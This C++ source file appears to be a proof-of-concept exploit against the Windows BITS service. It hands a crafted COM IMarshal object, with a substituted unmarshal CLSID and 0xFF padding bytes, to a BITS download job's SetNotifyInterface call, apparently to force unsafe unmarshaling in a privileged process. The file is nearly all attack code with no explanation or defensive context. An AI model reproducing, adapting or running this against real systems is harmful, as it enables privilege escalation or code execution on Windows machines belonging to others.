#include <stdio.h>
#include <windows.h>
#include <hstring.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <shobjidl_core.h>
#include <string.h>
#include <windows.h>
#include <strsafe.h>
#include <tlhelp32.h>
#include <inspectable.h>
#include<shlobj_core.h>
#include<objidl.h>
#include <atlbase.h>
#include <vector>
#include <docobj.h>
#include <MsHtmcid.h>
#include <comutil.h>
#include <bits.h>

using namespace std;

IMarshal* pMarshal2;

class CMarshaller : public IMarshal
{
	LONG _ref_count;

	~CMarshaller() {}

public:

	CMarshaller(IMarshal* stg)
	{
		printf("this %x\n", this);

	}


	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR* __RPC_FAR* ppvObject)override
	{

		*ppvObject = nullptr;
		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		((IUnknown*)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			delete this;
		}
		return ret;
	}



	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void* pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void* pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID* pCid)
	{

		UUID  clsid;
		CLSIDFromString(L"{4844e347-e354-4b24-9e0c-f4ae31ad55db}", &clsid);
		*pCid = clsid;
		return S_OK;
	}
	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream* pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void* pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void* pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		IMarshal* pMarshal;
		HRESULT hr = CoGetStandardMarshal(riid, (LPUNKNOWN)pv, dwDestContext, pvDestContext, mshlflags, &pMarshal);
		hr = pMarshal->MarshalInterface(pStm, riid, pv, dwDestContext, pvDestContext, mshlflags);

		DWORD buf[1024];
		memset(buf, 0xff, 1024);
		pStm->Write(buf, 1024, 0);

		return 0;

	}


	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void* pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void* pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD* pSize)
	{

		*pSize = 1024;
		return S_OK;
	}



	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream* pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void** ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream* pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};




int main(int argc, char* argv[]) {


	CoInitializeEx(NULL, COINIT_MULTITHREADED);


	IBackgroundCopyJob* pJob;
	IBackgroundCopyManager* pQueueMgr;
	IID CLSID_BackgroundCopyManager;
	IID IID_IBackgroundCopyManager;

	GUID guidJob;

	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
	CLSIDFromString(L"{5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c}", &IID_IBackgroundCopyManager);


	CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
		CLSCTX_LOCAL_SERVER, IID_IBackgroundCopyManager, (void**)&pQueueMgr);



	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
	CLSIDFromString(L"{00000003-0000-0000-C000-000000000046}", &IID_IBackgroundCopyManager);

	CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
		CLSCTX_LOCAL_SERVER, IID_IBackgroundCopyManager, (void**)&pMarshal2);

	CMarshaller* p = new CMarshaller(pMarshal2);


	HRESULT hr;

	pQueueMgr->CreateJob(L"BitsAuthSample",
		BG_JOB_TYPE_DOWNLOAD,
		&guidJob,
		&pJob);

	printf("%x", pJob->SetNotifyInterface(p));

	getchar();

	return 0;
}

